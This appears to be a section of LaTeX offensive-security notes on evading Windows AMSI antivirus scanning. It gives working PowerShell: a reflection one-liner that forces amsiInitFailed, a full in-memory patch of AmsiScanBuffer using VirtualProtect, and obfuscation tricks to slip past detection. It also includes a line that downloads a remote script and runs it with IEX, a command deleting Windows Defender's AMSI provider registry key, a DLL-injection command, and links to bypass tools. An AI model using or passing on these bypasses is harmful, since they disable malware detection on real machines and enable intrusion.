\section{AMSI bypass}

\verb+System.Management.Automation.AmsiUtils+ 

the \verb+System.Management.Automation.dll+ is located inside:
\begin{verbatim}
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35
\end{verbatim}

and can be loaded with \verb+dnspy+

Inspecting the \verb+AmsiScanBuffer+ function which scans a memory buffer for malware. Many applications and services leverage this function. Within the .NET framework, the Common Language Runtime (CLR) leverages the \verb+ScanContent+ function in the \verb+AmsiUtils+ Class inside \verb+System.Management.Automation.dll+, which is part of PowerShell’s core libraries and leads to the \verb+AmsiScanBuffer+ call.

\verb+AMSI_RESULT_NOT_DETECTED+: No detection found, but the result might change after a future definition update.


\subsection{String manipulation}

\href{https://www.sharepointdiary.com/2021/11/powershell-string-manipulation-comprehensive-guide.html#h-replacing-strings}{PowerShell String Manipulation: A Comprehensive Guide}
\begin{itemize}
    \item concat \verb-'amsi'+'Utils'-
    \item removing \verb+'amsiXXXXXUtils'.Remove(4,5)+
    \item b64 decoding (from utf-8 LF(Unix))
\begin{verbatim}
$ echo -n "amsiUtils" | iconv --to-code UTF-8 | base64 -w 0
YW1zaVV0aWxz

$e = 'YW1zaVV0aWx'
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($e)) 

$ echo -n "amsiUtils" | iconv --to-code UTF-16LE | base64 -w 0
YQBtAHMAaQBVAHQAaQBsAHMA
$e = 'YQBtAHMAaQBVAHQAaQBsAHMA'
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e))
\end{verbatim}

\end{itemize}

\subsection{Memory Patching}

\subsubsection{amsiInitFailed}

When Analysing the \verb+ScanContent+ method of \verb+AmsiUtils+:

\begin{verbatim}
if (string.IsNullOrEmpty(sourceMetadata))
{
	sourceMetadata = string.Empty;
}
if (InternalTestHooks.UseDebugAmsiImplementation && content.IndexOf("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", StringComparison.Ordinal) >= 0)
{
	return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED;
}
if (AmsiUtils.amsiInitFailed)
{
	return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
}
\end{verbatim}

sets \verb+amsiInitFailed+ to \verb+true+ so that the method \verb+ScanContent+ will always return \verb+AMSI_RESULT_NOT_DETECTED+.
\begin{verbatim}
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
GetField('amsiInitFailed','NonPublic,Static').SetValue($null,!$false)
\end{verbatim}

after Need to perform obfuscation of the command :
\begin{itemize}
    \item \verb+true+ can be replaced with \verb+!$false+
    \item use string concat \verb-'amsiInit'+'Failed'-
\end{itemize}

\subsubsection{amsiScanBuffer}
Remember that \verb+AmsiScanString+ uses \verb+AmsiScanBuffer+ underneath.

\href{https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer}{AmsiScanBuffer function}

If this function succeeds, it returns \verb+S_OK+. Otherwise, it returns an \href{https://learn.microsoft.com/en-us/windows/win32/seccrypto/common-hresult-values}{HRESULT} error code.

The basics of the bypass vulnerability is this:
\begin{enumerate}
    \item 
        Load amsi.dll (which happens automatically when PowerShell session is opened)
    \item 
        Patch the \verb+AmsiScanBuffer()+ function so that it always returns \verb+AMSI_RESULT_CLEAN+. This allows for any commands in the PowerShell session to execute without AMSI blocking it.
\end{enumerate}

AmsiScanBuffer returns an HRESULT value, which can be either \verb+S_OK+ or some error code. Based on this description, we can assume that \verb+amsi_RESULT+ is set to \verb+amsi_RESULT2+ when \verb+AmsiScanBuffer+ returns \verb+S_OK+, and \verb+AMSI_RESULT_NOT_DETECTED+ when an error code is returned. This means, that if we patch \verb+AmsiScanBuffer+ so that it always returns an error code, we should be able to bypass AMSI.

Looking up common HRESULT values, we can arbitrarily pick \verb+E_FAIL+ which has the value \verb+0x80004005+
Using the \href{https://defuse.ca/online-x86-assembler.htm}{Online x86 / x64 Assembler and Disassembler tool}, we can generate shellcode
\begin{verbatim}
mov eax, 0x80004005;
ret;
\end{verbatim}



\begin{verbatim}
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;
$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);
$hModule = [Kernel32]::LoadLibrary("amsi.dll");
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
$lpflOldProtect = 0;
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
$marshal = [System.Runtime.InteropServices.Marshal];
$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;
\end{verbatim}

\begin{verbatim}
(new-Object Net.WebClient).DownloadString('http://XXX/bypass-2.ps1')|IEX;
\end{verbatim}



\subsection{Forcing an Error}

\subsection{Registry Key Modification}
AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. The GUID for Windows Defender is displayed below:
\begin{verbatim}
HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
\end{verbatim}

Removing the registry key of the AMSI provider will disable the ability of windows defender to perform AMSI inspection and evade the control. However, deleting a registry key is not considered a stealthy approach (if there is sufficient monitoring in place) and also requires elevated rights.

\begin{verbatim}
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
\end{verbatim}

\subsection{Hooking}

Tom Carver created a proof of concept in the form of a DLL file which evades AMSI by hooking into the “AmsiScanBuffer” function. The “AmsiScanBuffer” will then be executed with dummy parameters. The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed.

\begin{verbatim}
SimpleInjector.exe powershell.exe .\AmsiHook.dll
\end{verbatim}

\subsection{DLL Hijacking}

\subsection{Tools}
\begin{itemize}
    \item 
        \url{https://github.com/rasta-mouse/AmsiScanBufferBypass}
    \item 
        \url{https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998}
    \item 
        \url{https://gist.github.com/am0nsec/986db36000d82b39c73218facc557628}
    \item 
        \url{https://gist.github.com/am0nsec/854a6662f9df165789c8ed2b556e9597}
    \item 
        \url{https://github.com/med0x2e/NoAmci}
    \item 
        \url{https://github.com/tomcarver16/AmsiHook}
\end{itemize}

\subsection{Links}

\begin{itemize}
    \item 
        \href{https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell}{S3cur3Th1sSh1t/Amsi-Bypass-Powershell}
\end{itemize}
